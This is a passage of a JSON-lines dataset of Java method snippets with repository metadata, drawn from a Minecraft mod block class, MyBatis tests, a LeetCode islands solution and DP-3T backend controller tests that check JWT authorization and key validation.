"https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 58316, "method_name": "clientLoad", "class_name": "PottedYellowAmaranthBlock", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\n\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 58317, "method_name": "isNormalCube", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\n\t\t\treturn false;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58318, "method_name": "propagatesSkylightDown", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\n\t\t\treturn true;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58319, "method_name": "getShape", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos", "ISelectionContext"], "throws": null, "modifiers": ["public"], "return_type": "VoxelShape", "snippet": "\t\tpublic VoxelShape getShape(BlockState state, IBlockReader world, BlockPos pos, ISelectionContext context) {\n\t\t\treturn VoxelShapes.create(0.312D, 0D, 0.312D, 0.688D, 0.375D, 0.688D);\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58320, "method_name": "tickRate", "class_name": "CustomBlock", "params": ["IWorldReader"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int tickRate(IWorldReader world) {\n\t\t\treturn 0;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58321, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(YellowAmaranthBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58322, "method_name": "getMaterialColor", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "MaterialColor", "snippet": "\t\tpublic MaterialColor getMaterialColor(BlockState state, IBlockReader blockAccess, BlockPos pos) {\n\t\t\treturn MaterialColor.STONE;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58323, "method_name": "getPushReaction", "class_name": "CustomBlock", "params": ["BlockState"], "throws": null, "modifiers": ["public"], "return_type": "PushReaction", "snippet": "\t\tpublic PushReaction getPushReaction(BlockState state) {\n\t\t\treturn PushReaction.DESTROY;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58324, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(Blocks.FLOWER_POT, (int) (1)));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58325, "method_name": "removedByPlayer", "class_name": "CustomBlock", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "boolean", "IFluidState"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean removedByPlayer(BlockState state, World world, BlockPos pos, PlayerEntity entity, boolean willHarvest, IFluidState fluid) {\n\t\t\tboolean retval = super.removedByPlayer(state, world, pos, entity, willHarvest, fluid);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tYellowAmaranthPlayerProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t\treturn retval;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58326, "method_name": "onExplosionDestroy", "class_name": "CustomBlock", "params": ["World", "BlockPos", "Explosion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onExplosionDestroy(World world, BlockPos pos, Explosion e) {\n\t\t\tsuper.onExplosionDestroy(world, pos, e);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tYellowAmaranthExplosionProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58327, "method_name": "onBlockActivated", "class_name": "CustomBlock", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "Hand", "BlockRayTraceResult"], "throws": null, "modifiers": ["public"], "return_type": "ActionResultType", "snippet": "\t\tpublic ActionResultType onBlockActivated(BlockState state, World world, BlockPos pos, PlayerEntity entity, Hand hand,\n\t\t\t\tBlockRayTraceResult hit) {\n\t\t\tsuper.onBlockActivated(state, world, pos, entity, hand, hit);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\tDirection direction = hit.getFace();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"entity\", entity);\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tRightClickedYellowAmaranthProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t\treturn ActionResultType.SUCCESS;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58328, "method_name": "serializeAndDeserializeObject", "class_name": "UtilityTester", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void serializeAndDeserializeObject(Object myObject) {\n\n    try {\n      deserialzeObject(serializeObject(myObject));\n    } catch (IOException e) {\n      System.out.println(\"Exception: \" + e.toString());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58329, "method_name": "serializeObject", "class_name": "UtilityTester", "params": ["Object"], "throws": ["IOException"], "modifiers": ["static", "private"], "return_type": "byte", "snippet": "  private static byte[] serializeObject(Object myObject) throws IOException {\n    try {\n      ByteArrayOutputStream myByteArrayOutputStream = new ByteArrayOutputStream();\n\n      // Serialize to a byte array\n      try (ObjectOutputStream myObjectOutputStream = new ObjectOutputStream(myByteArrayOutputStream)) {\n        myObjectOutputStream.writeObject(myObject);\n      }\n\n      // Get the bytes of the serialized object\n      byte[] myResult = myByteArrayOutputStream.toByteArray();\n      return myResult;\n    } catch (Exception anException) {\n      throw new RuntimeException(\"Problem serializing: \" + anException.toString(), anException);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58330, "method_name": "deserialzeObject", "class_name": "UtilityTester", "params": ["byte"], "throws": null, "modifiers": ["static", "private"], "return_type": "Object", "snippet": "  private static Object deserialzeObject(byte[] aSerializedObject) {\n    // Deserialize from a byte array\n    try (ObjectInputStream myObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(aSerializedObject))) {\n      return myObjectInputStream.readObject();\n    }\n    catch (Exception anException) {\n      throw new RuntimeException(\"Problem deserializing\", anException);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58331, "method_name": "numIslands", "class_name": "NumberOfIslands", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numIslands(char[][] grid) {\n        int count = 0;\n\n        for(int i = 0; i < grid.length; i ++) {\n            for(int j = 0; j < grid[i].length; j ++) {\n                if(grid[i][j] == '1') {\n                    fill(grid, i, j);\n                    count ++;\n                }\n            }\n        }\n\n        return count;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/NumberOfIslands.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58332, "method_name": "fill", "class_name": "NumberOfIslands", "params": ["char", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void fill(char[][] grid, int i, int j) {\n        if(i < 0 || i >= grid.length || j < 0 || j >= grid[i].length || grid[i][j] == '0') {\n            return;\n        }\n\n        grid[i][j] = '0';\n\n        fill(grid, i + 1, j);\n        fill(grid, i - 1, j);\n        fill(grid, i, j + 1);\n        fill(grid, i, j - 1);\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/NumberOfIslands.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58333, "method_name": "deuCerto", "class_name": "Transacao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean deuCerto() {\n\t\tSystem.out.println(\"transacao deuCerto\");\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/Transacao.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58334, "method_name": "setupDb", "class_name": "DuplicateStatementsTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setupDb() throws Exception {\n      // create a SqlSessionFactory\n      try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/duplicate_statements/mybatis-config.xml\")) {\n        sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n      }\n\n      // populate in-memory database\n      BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n              \"org/apache/ibatis/submitted/duplicate_statements/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58335, "method_name": "shouldGetAllUsers", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAllUsers() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<User> users = mapper.getAllUsers();\n      Assertions.assertEquals(10, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58336, "method_name": "shouldGetFirstFourUsers", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetFirstFourUsers() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<User> users = mapper.getAllUsers(new RowBounds(0, 4));\n      Assertions.assertEquals(4, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58337, "method_name": "shouldGetAllUsers_Annotated", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAllUsers_Annotated() {\n    sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapper.class);\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n      List<User> users = mapper.getAllUsers();\n      Assertions.assertEquals(10, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58338, "method_name": "shouldGetFirstFourUsers_Annotated", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetFirstFourUsers_Annotated() {\n    sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapper.class);\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n      List<User> users = mapper.getAllUsers(new RowBounds(0, 4));\n      Assertions.assertEquals(4, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58339, "method_name": "shouldFailForDuplicateMethod", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFailForDuplicateMethod() {\n    Assertions.assertThrows(IllegalArgumentException.class,\n        () -> sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapperExtended.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58340, "method_name": "testHello", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testHello() throws Exception {\n\t\tMockHttpServletResponse response = mockMvc.perform(get(\"/v1\")).andExpect(status().is2xxSuccessful()).andReturn()\n\t\t\t\t.getResponse();\n\n\t\tassertNotNull(response);\n\t\tassertEquals(\"Hello from DP3T WS\", response.getContentAsString());\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58341, "method_name": "testJWT", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testJWT() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is2xxSuccessful()).andReturn().getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58342, "method_name": "testMultipleKeyUpload", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testMultipleKeyUpload() throws Exception {\n\t\tvar requestList = new ExposeeRequestList();\n\t\tvar exposedKey1 = new ExposedKey();\n\t\texposedKey1.setKeyDate(OffsetDateTime.now(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposedKey1.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\tvar exposedKey2 = new ExposedKey();\n\t\texposedKey2.setKeyDate(OffsetDateTime.now(ZoneOffset.UTC).minusDays(1).toInstant().toEpochMilli());\n\t\texposedKey2.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\tList<ExposedKey> exposedKeys = List.of(exposedKey1, exposedKey2);\n\t\trequestList.setExposedKeys(exposedKeys);\n\t\trequestList.setFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(post(\"/v1/exposedlist\")\n\t\t\t\t.contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(requestList))).andExpect(status().is2xxSuccessful())\n\t\t\t\t.andReturn().getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposedlist\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(requestList)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58343, "method_name": "testMultipleKeyFakeUpload", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testMultipleKeyFakeUpload() throws Exception {\n\t\tvar requestList = new ExposeeRequestList();\n\t\tvar exposedKey1 = new ExposedKey();\n\t\texposedKey1.setKeyDate(OffsetDateTime.now(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposedKey1.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\tvar exposedKey2 = new ExposedKey();\n\t\texposedKey2.setKeyDate(OffsetDateTime.now(ZoneOffset.UTC).minusDays(1).toInstant().toEpochMilli());\n\t\texposedKey2.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\tList<ExposedKey> exposedKeys = List.of(exposedKey1, exposedKey2);\n\t\trequestList.setExposedKeys(exposedKeys);\n\t\trequestList.setFake(1);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(post(\"/v1/exposedlist\")\n\t\t\t\t.contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(requestList))).andExpect(status().is2xxSuccessful())\n\t\t\t\t.andReturn().getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposedlist\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(requestList)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58344, "method_name": "testMultipleKeyNonEmptyUpload", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testMultipleKeyNonEmptyUpload() throws Exception {\n\t\tvar requestList = new ExposeeRequestList();\n\t\tList<ExposedKey> exposedKeys = new ArrayList<ExposedKey>();\n\t\trequestList.setExposedKeys(exposedKeys);\n\t\trequestList.setFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(post(\"/v1/exposedlist\")\n\t\t\t\t.contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(requestList))).andExpect(status().is(400)).andReturn()\n\t\t\t\t.getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposedlist\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(requestList)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58345, "method_name": "testMultipleKeyNonNullUpload", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testMultipleKeyNonNullUpload() throws Exception {\n\t\tvar requestList = new ExposeeRequestList();\n\t\tList<ExposedKey> exposedKeys = new ArrayList<ExposedKey>();\n\t\trequestList.setFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(post(\"/v1/exposedlist\")\n\t\t\t\t.contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(requestList))).andExpect(status().is(400)).andReturn()\n\t\t\t\t.getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposedlist\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(requestList)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58346, "method_name": "keyNeedsToBeBase64", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void keyNeedsToBeBase64() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(\"testKey32Bytes--testKey32Bytes--\");\n\t\texposeeRequest.setIsFake(1);\n\t\tString token = createToken(true, OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(400)).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58347, "method_name": "testJWTFake", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testJWTFake() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(1);\n\t\tString token = createToken(true, 